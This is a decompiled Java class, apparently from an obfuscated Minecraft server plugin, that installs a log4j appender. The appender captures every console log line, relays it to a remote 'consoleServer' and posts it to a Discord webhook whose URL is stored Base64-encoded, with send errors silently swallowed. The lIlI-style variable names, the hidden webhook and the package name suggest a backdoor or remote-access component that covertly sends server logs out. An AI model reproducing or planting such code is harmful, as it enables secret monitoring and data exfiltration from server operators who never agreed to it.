/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.apache.logging.log4j.core.LogEvent
 *  org.apache.logging.log4j.core.appender.AbstractAppender
 */
package me.system.runner.methods;

import com.github.gist.DiscordWebhook;
import java.io.IOException;
import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.data.DataManager;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.appender.AbstractAppender;

public class LogAppender
extends AbstractAppender {
    public void append(LogEvent lllllllllllllllllllIlIIllIIllIlI) {
        String lllllllllllllllllllIlIIllIIllIIl = lllllllllllllllllllIlIIllIIllIlI.getMessage().getFormattedMessage();
        lllllllllllllllllllIlIIllIIllIIl = String.valueOf(new StringBuilder().append("[").append(lllllllllllllllllllIlIIllIIllIlI.getLevel().toString()).append("] ").append(lllllllllllllllllllIlIIllIIllIIl));
        if (Core.consoleServer != null) {
            Core.consoleServer.broadcastMessage(lllllllllllllllllllIlIIllIIllIIl.replaceAll("\u00a7f", "").replaceAll("\u00a76", "").replaceAll("\u00a7a", "").replaceAll("\u00a7c", "").replaceAll("\u00a77", "").replaceAll("\u00a7e", "").replaceAll("\u00a7o", "").replaceAll("\u00a7m", ""));
        }
        if (DataManager.getData().getString("wh").length() > 2) {
            byte[] lllllllllllllllllllIlIIllIIlllIl = Base64.getDecoder().decode(DataManager.getData().getString("wh"));
            DiscordWebhook lllllllllllllllllllIlIIllIIlllII = new DiscordWebhook(new String(lllllllllllllllllllIlIIllIIlllIl));
            lllllllllllllllllllIlIIllIIlllII.setContent(lllllllllllllllllllIlIIllIIllIIl);
            try {
                lllllllllllllllllllIlIIllIIlllII.execute();
            }
            catch (IOException lllllllllllllllllllIlIIllIIlIlII) {
                // empty catch block
            }
        }
    }

    public LogAppender() {
        super("MyLogAppender", null, null);
        LogAppender lllllllllllllllllllIlIIllIlIIIll;
        lllllllllllllllllllIlIIllIlIIIll.start();
    }
}

